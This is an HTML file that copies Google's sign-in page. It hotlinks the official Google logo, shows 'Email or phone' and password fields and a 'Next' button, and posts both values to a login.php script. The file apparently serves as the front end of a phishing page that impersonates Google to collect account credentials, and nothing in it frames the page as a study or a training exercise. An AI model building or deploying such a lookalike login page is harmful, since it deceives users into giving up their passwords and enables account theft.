<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google-like Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Arial', sans-serif;
            background-color: #f2f2f2;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 2rem;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
            width: 350px;
        }
        .logo {
            margin-bottom: 1rem;
        }
        .logo img {
            width: 75px;
        }
        .login-title {
            font-size: 1.5rem;
            margin-bottom: 1rem;
        }
        .login-input {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: 1px solid #dcdcdc;
            border-radius: 4px;
            font-size: 1rem;
        }
        .login-button {
            width: 100%;
            padding: 0.5rem;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            cursor: pointer;
        }
        .login-button:hover {
            background-color: #357ae8;
        }
        .login-footer {
            margin-top: 1rem;
        }
        .login-footer a {
            color: #4285f4;
            text-decoration: none;
        }
        .login-footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo">
        </div>
        <div class="login-title">Sign in</div>
        <form action="login.php" method="post">
            <input type="email" name="email" class="login-input" placeholder="Email or phone" required>
            <input type="password" name="password" class="login-input" placeholder="Password" required>
            <button type="submit" class="login-button">Next</button>
        </form>
        <div class="login-footer">
            <a href="#">Forgot email?</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>
